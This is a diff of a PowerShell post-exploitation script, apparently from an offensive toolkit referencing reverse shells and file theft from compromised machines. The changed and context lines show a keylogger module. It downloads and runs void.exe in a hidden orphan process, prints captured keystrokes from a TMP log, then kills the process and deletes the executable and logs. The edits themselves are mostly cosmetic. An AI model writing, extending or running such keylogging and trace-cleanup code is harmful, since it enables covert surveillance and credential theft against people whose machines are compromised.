@@ -73,14 +73,14 @@
 .EXAMPLE
    PS C:\> .\webserver.ps1 -Keylogger Start
    Download/Execute void.exe in child process
-   to be abble to capture remote host keystrokes.
+   to be abble to capture system keystrokes.
 
 .EXAMPLE
    PS C:\> .\webserver.ps1 -Keylogger Stop
    Stop keylogger by is process FileName identifier
-   and  delete keylogger and all respective files/logs
+   and delete keylogger and all respective files/logs.
    This parameter can NOT be used together with other parameters
-   because after completing is task (Stop keylogger proc) it exits.
+   because after completing is task (Stop keylogger) it exits.
 
 .EXAMPLE
    PS C:\> .\webserver.ps1 -SEnum True
@@ -123,6 +123,7 @@
     https://github.com/r00t-3xp10it/venom/wiki/CmdLine-&-Scripts-for-reverse-TCP-shell-addicts
     https://github.com/r00t-3xp10it/venom/wiki/cmdlet-to-download-files-from-compromised-target-machine
 #>
+
 
 ## Non-Positional cmdlet named parameters
 [CmdletBinding(PositionalBinding=$false)] param(
@@ -169,7 +170,6 @@ $Banner = @"
 "@;
 Clear-Host;
 Write-Host $Banner;
-$MyServer = Get-Process powershell -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1
 
 If($Download -ne "False"){
 $ServerIP = $Download.split(',')[0] ## Extract server ip addr from -Download "string"
@@ -425,6 +425,7 @@ $Timer = Get-Date -Format 'HH:mm:ss'
    .EXAMPLE
       PS C:\> .\webserver.ps1 -Keylogger Start
       Download/Execute void.exe in child process
+      to be abble to capture system keystrokes
 
    .EXAMPLE
       PS C:\> .\webserver.ps1 -Keylogger Stop
@@ -463,7 +464,7 @@ $Timer = Get-Date -Format 'HH:mm:ss'
          Remove-Item -Path "$Env:TMP\void" -Force -Recurse -EA SilentlyContinue
          Remove-Item -Path "$Env:TMP\void.zip" -Force
 
-         ## Start void.exe in an orphan process
+         ## Start void.exe (keylogger) in an orphan (child) process
          Start-Process -WindowStyle hidden -FilePath "$Env:TMP\void.exe" -ErrorAction SilentlyContinue|Out-Null
          Start-Sleep -Seconds 2;$PIDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1
 
@@ -488,25 +489,21 @@ $Timer = Get-Date -Format 'HH:mm:ss'
       # Stops process and Delete files/logs
       Write-Host "Captured keystrokes"
       Write-Host "-------------------" -ForegroundColor DarkGreen
-      If(Test-Path -Path "$Env:TMP\void.log"){
-         Get-Content -Path "$Env:TMP\void.log"
-      }
-      Write-Host ""
+      If(Test-Path -Path "$Env:TMP\void.log"){Get-Content -Path "$Env:TMP\void.log"};Write-Host ""
       write-host "Stoping keylogger process (void.exe)" -ForeGroundColor Green;Start-Sleep -Seconds 1
       $IDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1
 
       If($IDS){## keylogger process found
-         taskkill /F /IM void.exe|Out-Null
+         cmd /c taskkill /F /IM void.exe|Out-Null
          If($? -ieq 'True'){## Check Last Command ErrorCode (LASTEXITCODE)
-            write-host "Keylogger PID $IDS process successfuly stoped.`n" -ForeGroundColor Green
+            write-host "Keylogger PID $IDS process successfuly stoped." -ForeGroundColor Green
          }Else{
             write-host "[fail] to terminate keylogger PID process" -ForeGroundColor Red -BackgroundColor Black
-            write-host ""
          }
       }Else{
-         write-host "[fail] keylogger process PID not found" -ForeGroundColor Red -BackgroundColor Black
-         write-host ""
+         write-host "[fail] keylogger process not found" -ForeGroundColor Red -BackgroundColor Black
       }
+      write-host ""
       ## Clean old files
       Remove-Item -Path "$Env:TMP\void.log" -EA SilentlyContinue -Force
       Remove-Item -Path "$Env:TMP\void.exe" -EA SilentlyContinue -Force
